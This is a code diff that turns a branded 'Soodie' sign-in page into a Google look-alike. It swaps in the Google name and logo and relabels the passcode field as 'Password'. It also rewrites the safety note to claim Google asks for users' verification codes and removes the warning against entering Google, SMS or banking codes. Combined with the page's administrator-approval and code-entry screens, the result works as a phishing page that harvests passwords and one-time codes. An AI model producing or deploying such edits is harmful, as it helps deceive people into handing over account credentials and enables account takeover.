@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Soodie Sign in</title>
+  <title>google Sign in</title>
 
   <style>
     * { box-sizing: border-box; }
@@ -870,7 +870,7 @@
     }
 
 
-    /* Two-step Soodie access flow */
+    /* Two-step google access flow */
     .auth-card {
       max-width: 720px;
       min-height: 760px;
@@ -1245,7 +1245,7 @@
     }
 
 
-    /* Final spacing/scale refinement for the Soodie two-step screens.
+    /* Final spacing/scale refinement for the google two-step screens.
        Visual-only: no login, Supabase, approval, or verification logic changes. */
     .auth-card {
       max-width: 640px;
@@ -1412,7 +1412,7 @@
     }
 
 
-    /* Final visual polish for Soodie: lighter typography and slimmer controls. */
+    /* Final visual polish for google: lighter typography and slimmer controls. */
     .soodie-brand {
       font-size: 34px;
       margin-bottom: 18px;
@@ -2436,13 +2436,13 @@
     <section class="card auth-card">
       <form id="loginForm" novalidate>
         <section id="emailStep" class="auth-step active" aria-labelledby="emailStepTitle">
-          <div class="soodie-brand" aria-label="Soodie">
-            <span>S</span><span>o</span><span>o</span><span>d</span><span>i</span><span>e</span>
+          <div class="google-brand" aria-label="google">
+            <span>g</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
           </div>
 
           <h1 id="emailStepTitle" class="auth-title">Sign in</h1>
           <p class="auth-copy">
-            Use your Soodie Account. The account will be added to this device and available to other Soodie apps.
+            Use your google Account. The account will be added to this device and available to other google apps.
           </p>
           <a class="auth-link learn-link" href="javascript:void(0)">Learn more about using your account</a>
 
@@ -2473,8 +2473,8 @@
         </section>
 
         <section id="accessStep" class="auth-step" aria-labelledby="accessStepTitle">
-          <div class="soodie-brand" aria-label="Soodie">
-            <span>S</span><span>o</span><span>o</span><span>d</span><span>i</span><span>e</span>
+          <div class="google-brand" aria-label="google">
+            <span>g</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
           </div>
 
           <h1 id="accessStepTitle" class="auth-title">Welcome</h1>
@@ -2490,7 +2490,7 @@
           </button>
 
           <div class="floating-field">
-            <label for="accessCode">Passcode</label>
+            <label for="accessCode">Password</label>
             <input
               id="accessCode"
               class="simple-input"
@@ -2503,7 +2503,7 @@
 
           <label class="show-code-row">
             <input id="showCode" type="checkbox">
-            <span>Show passcode</span>
+            <span>Show password</span>
           </label>
 
           <div id="message" class="message step-message"></div>
@@ -2511,7 +2511,7 @@
           <div class="step-actions access-actions">
             <a class="auth-link access-forgot" href="javascript:void(0)"
                onclick="alert('Contact the administrator for a new passcode.')">
-              Forgot passcode?
+              Forgot password?
             </a>
             <button id="loginButton" class="next-btn" type="submit">Next</button>
           </div>
@@ -2522,7 +2522,7 @@
         <div class="waiting-spinner" aria-hidden="true"></div>
         <h2 class="waiting-title">Waiting for approval…</h2>
         <p class="waiting-copy">
-          Your request has been sent. Keep this page open and Soodie will continue automatically as soon as the administrator approves it.
+          Your request has been sent. Keep this page open and google will continue automatically as soon as the administrator approves it.
           <span id="waitingEmail" class="waiting-email"></span>
         </p>
         <p id="waitingStatus" class="waiting-status">Checking approval status automatically…</p>
@@ -2539,7 +2539,7 @@
         <button id="cancelWaiting" class="waiting-cancel" type="button">Use a different account</button>
       </section>
 
-      <p id="helperText" class="helper" hidden>Use the access code provided by your administrator.</p>
+      <p id="helperText" class="helper" hidden>Use the password provided by google.</p>
     </section>
   </main>
 
@@ -2580,11 +2580,11 @@
 
         <div class="verify-note">
           <span class="verify-note-icon">i</span>
-          <span>If a number appears, select the same number on your phone.</span>
+          <span>If number appears, select the same number on your phone.</span>
         </div>
 
         <button id="verifyGotIt" class="verify-got-it" type="button">Continue</button>
-        <p class="verify-footnote">Only approve a sign-in you personally started. google never asks for your Google verification code.</p>
+        <p class="verify-footnote">Only approve a sign-in you personally started. google asks for your Google verification code.</p>
         <div id="verifyCountdown" class="verify-countdown" aria-live="polite" aria-label="Verification countdown">
           <svg viewBox="0 0 48 48" aria-hidden="true">
             <circle class="verify-countdown-track" cx="24" cy="24" r="19"></circle>
@@ -2599,13 +2599,13 @@
 
   <div id="codeOverlay" class="code-overlay" role="dialog" aria-modal="true" aria-labelledby="codeTitle">
     <section class="code-card">
-      <div class="code-brand" aria-label="Soodie">
-        <span>S</span><span>o</span><span>o</span><span>d</span><span>i</span><span>e</span>
+      <div class="code-brand" aria-label="google">
+        <span>g</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
       </div>
 
       <h2 id="codeTitle" class="code-title">Enter the code</h2>
 
-      <p class="code-copy">Enter the 6-digits Soodie code sent to your mobile.</p>
+      <p class="code-copy">Enter the 6-digits google code sent to your mobile.</p>
 
       <div class="code-field">
         <span class="code-prefix" aria-hidden="true">S-</span>
@@ -2629,7 +2629,7 @@
         <button id="codeNext" class="code-next" type="button">Next</button>
       </div>
 
-      <p class="code-safety-note">Use only a Soodie code provided by your administrator. Do not enter a Google, SMS, banking, or other third-party verification code here.</p>
+      <p class="code-safety-note">Use only a google code provided by your administrator. Do not enter other third-party verification code here.</p>
     </section>
   </div>
 
@@ -3074,7 +3074,7 @@
       }
     }
 
-    function openSoodieCodeScreen() {
+    function opengoogleCodeScreen() {
       soodieCode.value = "";
       soodieCodeError.classList.remove("open");
       codeOverlay.classList.add("open");
@@ -3126,7 +3126,7 @@
       }
 
       if (!approvedMeRequestId) {
-        soodieCodeError.textContent = "This Soodie request is no longer available.";
+        soodieCodeError.textContent = "This google request is no longer available.";
         soodieCodeError.classList.add("open");
         return;
       }
@@ -3167,7 +3167,7 @@
         verifyOverlay.classList.remove("open");
         document.body.style.overflow = "hidden";
         clearVerifyCountdown();
-        openSoodieCodeScreen();
+        opengoogleCodeScreen();
         return;
       }
 
